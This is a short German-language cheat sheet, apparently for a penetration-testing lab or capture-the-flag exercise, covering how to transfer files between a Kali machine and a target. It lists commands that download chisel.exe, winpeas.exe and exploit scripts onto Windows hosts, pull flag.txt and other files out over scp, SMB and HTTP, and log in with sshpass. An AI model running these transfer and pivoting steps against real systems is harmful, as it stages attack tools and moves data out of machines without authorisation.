@@ -1,0 +1,36 @@
+Python-Server
+python3 -m http.server 8000
+Startet einen HTTP-Server auf Port 8000.
+
+Dateien auf Windows übertragen
+Invoke-WebRequest http://192.168.1.158:8000/FILE -OutFile FILE
+Lädt chisel.exe auf ein Windows-System.
+iwr http://192.168.2.103:8000/check.ps1 -OutFile C:\Users\Public\check.ps1 über Python Server
+
+WGet
+wget http://192.168.1.231:8000/derpissues.pcap
+Lädt eine Datei (falls wget installiert ist).
+
+SMB
+proxychains smbclient //192.168.2.221/Share
+Verbindet sich mit einem SMB-Share.
+
+scp, wget, curl
+
+updog
+
+manchmal im Browser IP:Port(z.B. Port 8080)
+
+copy "C:\Users\nebula\Desktop\forensics_artefacts.zip" "C:\xampp\htdocs\dev\" auf den Webserver hochladen und mit der Kali herunterladen
+falls man website hatte von der vm und das herüberziehen will
+
+copy \\tsclient\share\winpeas.exe C:\Users\Public\winpeas.exe
+beispiel, wenn man über smb verbunden ist, bei pivoting relevant
+
+certutil
+
+wenn man schon ssh hat, aber z.B. keinen Python server
+scp vuln@192.168.1.105:/Users/vuln/flag.txt Vulnbox zu Kali
+scp exploit.ps1 vuln@192.168.1.105:C:/Users/vuln/Desktop/ Kali zu Vulnbox
+
+sshpass -p ‚Password‘ ssh kali@localhost
